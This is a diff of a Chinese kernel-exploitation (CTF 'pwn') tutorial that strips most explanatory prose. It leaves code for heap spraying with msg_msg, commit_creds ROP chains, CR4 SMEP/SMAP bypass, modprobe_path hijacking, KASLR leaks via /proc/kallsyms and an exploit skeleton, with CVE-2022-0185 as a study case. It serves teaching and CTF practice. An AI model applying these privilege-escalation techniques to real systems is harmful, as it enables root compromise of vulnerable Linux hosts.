@@ -1,8 +1,4 @@
-# 内核 Pwn (Kernel Pwn)
 
-## 准备环境
-
-典型内核题包：
 
 ```text
 kernel/
@@ -14,7 +10,6 @@ kernel/
 └── (.config)        # 编译配置，可选
 ```
 
-### 拆 initramfs 改 init 脚本
 
 ```bash
 mkdir initramfs && cd initramfs
@@ -31,14 +26,12 @@ find . | cpio -o --format=newc | gzip > ../initramfs.cpio.gz
 cd ..
 ```
 
-### 提取 vmlinux（如果只给了 bzImage）
 
 ```bash
 # 用 extract-vmlinux 脚本（kernel 源码 scripts/）
 /usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
 ```
 
-### QEMU 启动参数模板
 
 ```bash
 #!/bin/sh
@@ -54,18 +47,9 @@ qemu-system-x86_64 \
     -s    # 开 gdb 端口 1234
 ```
 
-关键参数对应的保护：
 
-| 参数 | 含义 | 影响利用 |
 |------|------|---------|
-| `+smep` | 内核态不能执行用户态代码 | 必须用 ROP，不能跳到用户态 shellcode |
-| `+smap` | 内核态不能访问用户态数据 | rop 链不能放用户态，要放内核态（堆喷 / msgsnd） |
-| `+pku` | Protection Keys | 类似 SMAP |
-| `nokaslr` | 禁用 KASLR | 函数地址固定 |
-| `kaslr` | 启用 KASLR | 必须 leak |
-| `pti=on` | KPTI（Meltdown 修复） | 用户态返回需要 swapgs_restore_regs_and_return_to_usermode |
 
-### 调试
 
 ```bash
 # 终端 1
@@ -78,33 +62,12 @@ gdb vmlinux
 (gdb) c
 ```
 
-GEF 推荐用 bata24 维护的 fork，对内核结构体有专门 pretty-print。
 
-## 漏洞类型分流
-
-| 漏洞 | 典型来源 | 利用基线 |
 |------|---------|---------|
-| 内核栈溢出 | copy_from_user 长度可控 | 栈金丝雀 + KASLR → ROP |
-| 内核堆溢出 | kmalloc slab 越界写 | slab 喷射 + 覆盖相邻对象 |
-| UAF | refcount 错误 / 双 free | 重新申请同 slab → 控制释放对象 |
-| 整数溢出 | size 计算溢出 → 小分配大拷贝 | 实际是溢出，同上 |
-| TOCTOU | 用户态指针二次解引用 | userfaultfd / FUSE 拖时间 |
-| race | 双线程同时 ioctl | 卡时序窗口 |
-| 任意读写 | 已经是终极原语 | 直接改 cred / modprobe_path |
 
-## slab 喷射（堆 pwn 核心）
 
-把可控大小的内核对象喷到漏洞 slab，覆盖目标对象。
-
-| slab size | 喷射对象 | 优点 |
 |-----------|---------|------|
-| kmalloc-64 / 96 | `seq_operations` | 有函数指针，覆盖即控 IP |
-| kmalloc-1024 | `tty_struct` | 有 ops 指针，结构精美 |
-| kmalloc-4096 | `pipe_buffer` | 现代版主力，6.x 仍有效 |
-| 任意 size | `msg_msg` | 大小可控（8 - 4096+），sysv msgsnd 控数据 |
-| kmalloc-128 | `user_key_payload` | keyctl 系列接口 |
 
-### msg_msg 喷射示例
 
 ```c
 // 用户态触发
@@ -121,11 +84,9 @@ msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // 喷到 kmalloc-128
 msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // 读回看是不是被改了 → leak
 ```
 
-## 提权路径
 
 ### 1. commit_creds(prepare_kernel_cred(0)) ROP
 
-经典且通用。前提：能控 RIP（栈溢出 / vtable 劫持）。
 
 ```c
 // 用户态 ROP 链
@@ -144,14 +105,12 @@ uint64_t rop[] = {
 };
 ```
 
-**关键 gadget**（要在 vmlinux 里 ROPgadget 找）:
 
 ```bash
 ROPgadget --binary vmlinux --only "pop|ret" | grep 'pop rdi'
 ROPgadget --binary vmlinux --only "mov|ret" | grep 'mov rdi, rax'
 ```
 
-返回用户态前必须保存 cs/ss/rflags/rsp：
 
 ```c
 void save_state() {
@@ -165,7 +124,6 @@ void save_state() {
 void shell() { system("/bin/sh"); }
 ```
 
-### 2. modprobe_path 改 /tmp/x（最省事）
 
 ```text
 原理：
@@ -196,7 +154,6 @@ system("/tmp/trigger");
 system("/bin/su");
 ```
 
-**modprobe_path 地址来源**：vmlinux 里符号，或 /proc/kallsyms（如果 kptr_restrict=0）。
 
 ### 3. core_pattern hijack
 
@@ -206,9 +163,6 @@ system("/bin/su");
 缺点：需要触发 coredump，比 modprobe_path 笨重
 ```
 
-### 4. 内核 ROP 关 SMEP/SMAP
-
-如果就是想跳回用户态 shellcode（学习目的），可以 ROP 关 cr4 的 bit:
 
 ```c
 // CR4: SMEP = bit 20, SMAP = bit 21
@@ -222,19 +176,8 @@ uint64_t rop[] = {
 };
 ```
 
-实际上**真实利用基本不走这条路** — 直接 commit_creds ROP 更短更稳。
 
-## KASLR leak 渠道
-
-| 来源 | 限制 | 备注 |
 |------|------|------|
-| /proc/kallsyms | `kptr_restrict=0` 才有真地址 | CTF 常常开放 |
-| /sys/module/.../sections/.text | 同上 | 模块基址 |
-| dmesg | `dmesg_restrict=0` 才能读 | oops 信息泄漏地址 |
-| 内核栈未初始化读 | 漏洞本身要能任意读 | 残留地址 |
-| msg_msg + 漏洞 leak | 喷射后 OOB read | 通用 |
-| 旁路（Meltdown/Spectre） | KPTI 修了 Meltdown | 不通用 |
-| SIDT/SGDT 用户态指令 | 老内核可能漏 | 现代基本封了 |
 
 ```c
 // 经典：从 /proc/kallsyms 读
@@ -250,7 +193,6 @@ while (fgets(line, sizeof(line), f)) {
 unsigned long kbase = commit_creds - 0xXXXXX;  // 偏移看 vmlinux
 ```
 
-## 完整 exploit 模板（用户态 + ioctl 触发 + ROP 提权 + shell）
 
 ```c
 // exploit.c — 内核 pwn 通用骨架
@@ -332,7 +274,6 @@ int main(void) {
 }
 ```
 
-## 学习参考：CVE-2022-0185
 
 ```text
 漏洞：fs/fs_context.c 中 legacy_parse_param 长度计算有符号 / 无符号混淆
@@ -351,20 +292,3 @@ int main(void) {
 4. 手动重写：把 msg_msg 喷射改成 pipe_buffer 喷射版本（练习不同 slab 路径）
 5. 加上 KASLR leak（原版用 /proc/kallsyms，挑战版禁用后改 OOB read）
 ```
-
-主要技术点对应本文档的章节：
-
-- 漏洞类型 → "内核堆溢出"
-- 喷射对象 → "msg_msg 喷射"
-- 提权方法 → "commit_creds ROP" 或 "modprobe_path"
-- KASLR leak → "/proc/kallsyms" 或 "msg_msg + 漏洞 leak"
-
-## 注意事项
-
-- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** 让内核栈基址每次 syscall 都随机偏移 0-1023，影响所有依赖固定栈偏移的利用
-- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** 让 slab 内对象分配随机化，喷射成功率下降，要多喷
-- **CONFIG_STATIC_USERMODEHELPER** 把 modprobe_path 设为只读 `static_usermodehelper_path`，modprobe 攻击失效
-- **KPTI** 让用户态/内核态页表分离，返回用户态必须走 `swapgs_restore_regs_and_return_to_usermode` 这个 trampoline，不能直接 swapgs+iretq
-- **FG-KASLR**（function-granular KASLR）让函数级别随机化，需要 leak 多个符号反推每个函数偏移
-- **CET / IBT**（Intel 控制流强制）让间接跳转必须落在 ENDBR 指令，部分 gadget 失效
-- **不要在内核里调 printk 输出测试** — 串口 IO 会改变时序，破坏 race；用一个 magic 寄存器值（rcx=0xdeadbeef）+ gdb watch 来调试
